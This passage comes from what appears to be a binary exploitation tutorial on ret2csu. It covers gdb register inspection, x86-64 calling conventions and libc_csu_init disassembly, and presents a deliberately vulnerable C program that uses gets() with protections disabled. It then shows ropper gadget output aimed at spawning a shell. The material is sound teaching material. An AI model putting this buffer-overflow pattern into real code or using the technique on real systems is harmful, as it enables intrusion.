</span></span><span class="line"><span class="cl"><span class="nf">gs</span>             <span class="mi">0x0</span>	<span class="mi">0x0</span>
</span></span></code></pre></div><p>Thanks to <code>gdb-gef</code>, we already know most of the things which we needed to know i.e. which register holds what value, but as we looking for the registers and we need to know what is happening since this is required for further learning.</p>
<p>Using <code>gdb</code>&rsquo;s <code>x</code> command to analyze the memory and registers, we can see the following:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">s</span> <span class="no">$rdi</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x555555554738:</span>	<span class="err">&#34;</span><span class="nl">String:</span> <span class="err">%</span><span class="nf">s</span><span class="err">\</span><span class="no">nInteger</span><span class="p">:</span> <span class="nv">%d</span><span class="err">\</span><span class="no">nDouble</span><span class="p">:</span> <span class="nv">%lf</span><span class="err">\</span><span class="no">n</span><span class="err">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">s</span> <span class="no">$rsi</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x555555554728:</span>	<span class="err">&#34;</span><span class="nf">Hello</span> <span class="no">World</span><span class="err">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">s</span> <span class="no">$rdx</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x1:</span>	<span class="err">&lt;</span><span class="nl">error:</span> <span class="nf">Cannot</span> <span class="no">access</span> <span class="no">memory</span> <span class="no">at</span> <span class="no">address</span> <span class="mi">0x1</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">s</span> <span class="no">$rcx</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x4059000000000000:</span>	<span class="err">&lt;</span><span class="nl">error:</span> <span class="nf">Cannot</span> <span class="no">access</span> <span class="no">memory</span> <span class="no">at</span> <span class="no">address</span> <span class="mi">0x4059000000000000</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">f</span> <span class="no">$rcx</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x4059000000000000:</span>	<span class="nf">Cannot</span> <span class="no">access</span> <span class="no">memory</span> <span class="no">at</span> <span class="no">address</span> <span class="mi">0x4059000000000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>Breaking it down:-</p>
<ul>
<li><code>x555555554738:	&quot;String: %s\nInteger: %d\nDouble: %lf\n&quot;</code> : This is in register <code>rdi</code> which is passed as 1st argument to the <code>printf</code>.</li>
<li><code>0x555555554728:	&quot;Hello World&quot;</code> : This is in register <code>rsi</code> which is passed as 2nd argument to <code>printf</code>.</li>
<li><code>0x1:	&lt;error: Cannot access memory at address 0x1&gt;</code> : First, we got a <strong>Cannot access memory</strong> i.e. the <code>integer</code> which we printed has a value of <code>0x01</code>, hence a memory access error. This is passed to <code>rdx</code> register which is the 3rd argument to the <code>printf</code>.</li>
<li><code>0x4059000000000000:	Cannot access memory at address 0x4059000000000000</code> : Again, that happened because the value doesn&rsquo;t point to a valid address. This is the 4th argument which is passed to <code>printf</code>.</li>
</ul>
<blockquote>
<p>You might be wondering why we got a value like <code>0x4059000000000000</code> while we assigned <code>100</code> to the variable. That happened because the <code>x/f</code> printed an aligned value which doesn&rsquo;t print the double values normally. For checking double values we do <code>gef➤  p/f $rcx - $1 = 100</code>.</p>
</blockquote>
<p>From this we know how calling conventions works:-</p>
<ul>
<li>1st argument goes to <code>rdi</code>.</li>
<li>2nd argument goest to <code>rsi</code>.</li>
<li>3rd argument goes to <code>rdx</code></li>
<li>4th argument goes to <code>rcx</code>.</li>
</ul>
<blockquote>
<p>This is constant for every function in 64 bit calling convention on Linux System.</p>
</blockquote>
<h3 id="assembly-instructions" class="relative group">Assembly Instructions <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#assembly-instructions" aria-label="Anchor">#</a></span></h3><p>Since we understood the calling conventions, it&rsquo;s time to take a look at the assembly instructions we will deal with to understand the workflow of the payload. As an example, let&rsquo;s take the exact same binary and analyse it&rsquo;s <code>__libc_csu_init</code>, starting with <code>gdb</code> again:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">__libc_csu_init</span>
</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">__libc_csu_init</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006a0</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006a2</span> <span class="err">&lt;+</span><span class="mi">2</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006a4</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">r15</span><span class="p">,</span><span class="no">rdx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006a7</span> <span class="err">&lt;+</span><span class="mi">7</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">r13</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006a9</span> <span class="err">&lt;+</span><span class="mi">9</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">r12</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006ab</span> <span class="err">&lt;+</span><span class="mi">11</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">r12</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x200706</span><span class="p">]</span>        <span class="c1"># 0x200db8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000006b2</span> <span class="err">&lt;+</span><span class="mi">18</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006b3</span> <span class="err">&lt;+</span><span class="mi">19</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rbp</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x200706</span><span class="p">]</span>        <span class="c1"># 0x200dc0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000006ba</span> <span class="err">&lt;+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">rbx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006bb</span> <span class="err">&lt;+</span><span class="mi">27</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">r13d</span><span class="p">,</span><span class="no">edi</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006be</span> <span class="err">&lt;+</span><span class="mi">30</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">r14</span><span class="p">,</span><span class="no">rsi</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006c1</span> <span class="err">&lt;+</span><span class="mi">33</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">sub</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">r12</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006c4</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006c8</span> <span class="err">&lt;+</span><span class="mi">40</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">sar</span>    <span class="no">rbp</span><span class="p">,</span><span class="mi">0x3</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006cc</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x4f0</span> <span class="p">&lt;</span><span class="no">_init</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006d1</span> <span class="err">&lt;+</span><span class="mi">49</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">test</span>   <span class="no">rbp</span><span class="p">,</span><span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006d4</span> <span class="err">&lt;+</span><span class="mi">52</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">je</span>     <span class="mh">0x6f6</span> <span class="p">&lt;</span><span class="no">__libc_csu_init</span><span class="p">+</span><span class="mi">86</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006d6</span> <span class="err">&lt;+</span><span class="mi">54</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">xor</span>    <span class="no">ebx</span><span class="p">,</span><span class="no">ebx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006d8</span> <span class="err">&lt;+</span><span class="mi">56</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">nop</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rax</span><span class="p">*</span><span class="mi">1</span><span class="err">+</span><span class="mi">0x0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006e0</span> <span class="err">&lt;+</span><span class="mi">64</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006e3</span> <span class="err">&lt;+</span><span class="mi">67</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006e6</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="no">r13d</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006e9</span> <span class="err">&lt;+</span><span class="mi">73</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">r12</span><span class="err">+</span><span class="no">rbx</span><span class="p">*</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006ed</span> <span class="err">&lt;+</span><span class="mi">77</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>    <span class="no">rbx</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006f1</span> <span class="err">&lt;+</span><span class="mi">81</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">cmp</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rbx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006f4</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">jne</span>    <span class="mh">0x6e0</span> <span class="p">&lt;</span><span class="no">__libc_csu_init</span><span class="p">+</span><span class="mi">64</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006f6</span> <span class="err">&lt;+</span><span class="mi">86</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006fa</span> <span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">rbx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006fb</span> <span class="err">&lt;+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006fc</span> <span class="err">&lt;+</span><span class="mi">92</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r12</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000006fe</span> <span class="err">&lt;+</span><span class="mi">94</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r13</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000700</span> <span class="err">&lt;+</span><span class="mi">96</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000702</span> <span class="err">&lt;+</span><span class="mi">98</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000704</span> <span class="err">&lt;+</span><span class="mi">100</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">ret</span>    
</span></span></code></pre></div><p>Now, we see quite a lot of instructions, I&rsquo;ll explain it in one line since they&rsquo;re easy enough to get.</p>
<blockquote>
<p>Note: I will only explain the instruction which we will need to understand.</p>
</blockquote>
<ul>
<li><code>lea</code> : This instruction <strong>load effective address</strong> to a register.</li>
<li><code>mov</code> : This instruction is used to move an address/value to a register.</li>
<li><code>je</code> : This is a conditional instruction which means <strong>jump if equals to</strong> executes depending on the result of previous instruction.</li>
<li><code>jle</code>: This is also a conditional instruction which means <strong>jump if less than or equal to</strong> depending on the result of previous instruction.</li>
<li><code>call</code> : This instruction calls a subroutine.</li>
<li><code>cmp</code> : This compares register with a register or a register with a value.</li>
<li><code>add</code> : This adds the value given at right operand to left operand and store in it.</li>
<li><code>pop</code> : This pop the register which is given as an operand and wait for a value/address to be given.</li>
<li><code>ret</code> : This shows that a subroutine or instruction has been completed.</li>
</ul>
<h1 id="pwning-time" class="relative group">Pwning time <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#pwning-time" aria-label="Anchor">#</a></span></h1><hr>
<h4 id="attachments-" class="relative group">Attachments:- <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#attachments-" aria-label="Anchor">#</a></span></h4><p>Binary: <a href="/files/binary/chall">chall</a></p>
<p>Source File: <a href="/files/sources/chall.c">chall.c</a></p>
<p>Exploit: <a href="/files/exploits/xpl_ret2csu.py">xpl.py</a></p>
<hr>
<p>Now, since we are way past the required knowledge section, it&rsquo;s time to understand stuff practically since Pwning is best explained practically. Let&rsquo;s take a piece of <strong>vulnerable code</strong> and compile it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vulnerable</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="nf">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>          <span class="cm">/* Well, duh? :p */</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Welcome to the world of Pwning&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;I&#39;d like to know the name of brave warrior&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="nf">fgets</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;As a token of appreciation, how about pwning me?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="nf">vulnerable</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Let&rsquo;s compile it by disabling the stack canary and PIE to make it more understandable. Using <code>gcc --no-stack-protector -no-pie chall.c -o chall</code>:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> d4mianwayne@oracle: /tmp/ctf/pwn1 $ gcc --no-stack-protector -no-pie chall.c -o chall
</span></span><span class="line"><span class="cl">chall.c: In <span class="k">function</span> ‘vulnerable’:
</span></span><span class="line"><span class="cl">chall.c:7:2: warning: implicit declaration of <span class="k">function</span> ‘gets’<span class="p">;</span> did you mean ‘fgets’? <span class="o">[</span>-Wimplicit-function-declaration<span class="o">]</span>
</span></span><span class="line"><span class="cl">  gets<span class="o">(</span>buf<span class="o">)</span><span class="p">;</span>          /* Well, duh? :p */
</span></span><span class="line"><span class="cl">  ^~~~
</span></span><span class="line"><span class="cl">  fgets
</span></span><span class="line"><span class="cl">/tmp/ccr4ksWU.o: In <span class="k">function</span> <span class="sb">`</span>vulnerable<span class="s1">&#39;:
</span></span></span><span class="line"><span class="cl"><span class="s1">chall.c:(.text+0x15): warning: the `gets` function is dangerous and should not be used.
</span></span></span><span class="line"><span class="cl"><span class="s1"> d4mianwayne@oracle: /tmp/ctf/pwn1 $ ./chall
</span></span></span><span class="line"><span class="cl"><span class="s1">Welcome to the world of Pwning
</span></span></span><span class="line"><span class="cl"><span class="s1">I&#39;</span>d like to know the name of brave warrior
</span></span><span class="line"><span class="cl">Robin
</span></span><span class="line"><span class="cl">As a token of appreciation, how about pwning me?
</span></span><span class="line"><span class="cl">Hello World
</span></span></code></pre></div><p>It works as it is supposed to, right?. But, our end goal is to get a shell or do something it is not supposed to. Let&rsquo;s fire up gdb and see what we have and start analyzing the binary :-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">Reading</span> <span class="no">symbols</span> <span class="no">from</span> <span class="no">chall...</span><span class="p">(</span><span class="no">no</span> <span class="no">debugging</span> <span class="no">symbols</span> <span class="no">found</span><span class="p">)...</span><span class="no">done.</span>
</span></span><span class="line"><span class="cl"><span class="nf">GEF</span> <span class="no">for</span> <span class="no">linux</span> <span class="no">ready</span><span class="p">,</span> <span class="no">type</span> <span class="err">`</span><span class="no">gef</span><span class="err">&#39;</span> <span class="no">to</span> <span class="no">start</span><span class="p">,</span> <span class="err">`</span><span class="no">gef</span> <span class="no">config</span><span class="err">&#39;</span> <span class="no">to</span> <span class="no">configure</span>
</span></span><span class="line"><span class="cl"><span class="err">78</span> <span class="nf">commands</span> <span class="no">loaded</span> <span class="no">for</span> <span class="no">GDB</span> <span class="mi">8</span><span class="no">.1.0.20180409-git</span> <span class="no">using</span> <span class="no">Python</span> <span class="no">engine</span> <span class="mi">3</span><span class="no">.6</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">2</span> <span class="nf">commands</span> <span class="no">could</span> <span class="no">not</span> <span class="no">be</span> <span class="no">loaded</span><span class="p">,</span> <span class="no">run</span> <span class="err">`</span><span class="no">gef</span> <span class="no">missing</span><span class="err">`</span> <span class="no">to</span> <span class="no">know</span> <span class="no">why.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">info</span> <span class="no">functions</span> 
</span></span><span class="line"><span class="cl"><span class="no">All</span> <span class="no">defined</span> <span class="no">functions</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">Non-debugging</span> <span class="no">symbols</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000400470</span>  <span class="no">_init</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000004004a0</span>  <span class="no">puts@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000004004b0</span>  <span class="no">fgets@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000004004c0</span>  <span class="no">gets@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000004004d0</span>  <span class="no">_start</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000400500</span>  <span class="no">_dl_relocate_static_pie</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000400510</span>  <span class="no">deregister_tm_clones</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000400540</span>  <span class="no">register_tm_clones</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000400580</span>  <span class="no">__do_global_dtors_aux</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000004005b0</span>  <span class="no">frame_dummy</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000004005b7</span>  <span class="no">vulnerable</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000004005d3</span>  <span class="no">main</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000400630</span>  <span class="no">__libc_csu_init</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000004006a0</span>  <span class="no">__libc_csu_fini</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000004006a4</span>  <span class="no">_fini</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">vulnerable</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">vulnerable</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005b7</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005b8</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005bb</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x20</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005bf</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005c3</span> <span class="err">&lt;+</span><span class="mi">12</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005c6</span> <span class="err">&lt;+</span><span class="mi">15</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005cb</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x4004c0</span> <span class="p">&lt;</span><span class="no">gets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005d0</span> <span class="err">&lt;+</span><span class="mi">25</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004005d1</span> <span class="err">&lt;+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x00000000004005d2</span> <span class="err">&lt;+</span><span class="mi">27</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span></code></pre></div><p>As we have access to the source code, we pretty much know what exactly is going on. We need to find a way to get a shell and the <code>checksec</code> shows us we have a non-executable stack and <code>Partial Relro</code> which means GOT is overwritable but that&rsquo;s not the scope of this article, so we will keep it out.</p>
<hr>
<blockquote>
<p>We are going to perform <code>ret2libc</code> but this time instead of doing <code>system(&quot;/bin/sh&quot;)</code> we are going to do <code>execve(&quot;/bin/sh&quot;, 0, 0)</code></p>
</blockquote>
<hr>
<p>Let&rsquo;s run <code>ropper</code> and see what gadgets we can control:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"> <span class="nl">d4mianwayne@oracle:</span> <span class="err">/</span><span class="nf">tmp</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">pwn1</span> <span class="no">$</span> <span class="no">ropper</span> <span class="p">--</span><span class="no">file</span> <span class="no">chall</span> <span class="p">--</span><span class="no">search</span> <span class="err">&#39;</span><span class="no">pop</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">INFO</span><span class="p">]</span> <span class="no">Load</span> <span class="no">gadgets</span> <span class="no">for</span> <span class="no">section</span><span class="p">:</span> <span class="no">LOAD</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">LOAD</span><span class="p">]</span> <span class="no">loading...</span> <span class="mi">100</span><span class="err">%</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">LOAD</span><span class="p">]</span> <span class="no">removing</span> <span class="no">double</span> <span class="no">gadgets...</span> <span class="mi">100</span><span class="err">%</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">INFO</span><span class="p">]</span> <span class="no">Searching</span> <span class="no">for</span> <span class="no">gadgets</span><span class="p">:</span> <span class="no">pop</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">INFO</span><span class="p">]</span> <span class="no">File</span><span class="p">:</span> <span class="no">chall</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x000000000040068c:</span> <span class="nf">pop</span> <span class="no">r12</span><span class="c1">; pop r13; pop r14; pop r15; ret; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">0</span><span class="nl">x000000000040068e:</span> <span class="nf">pop</span> <span class="no">r13</span><span class="c1">; pop r14; pop r15; ret; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">0</span><span class="nl">x0000000000400690:</span> <span class="nf">pop</span> <span class="no">r14</span><span class="c1">; pop r15; ret; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">0</span><span class="nl">x0000000000400692:</span> <span class="nf">pop</span> <span class="no">r15</span><span class="c1">; ret; 
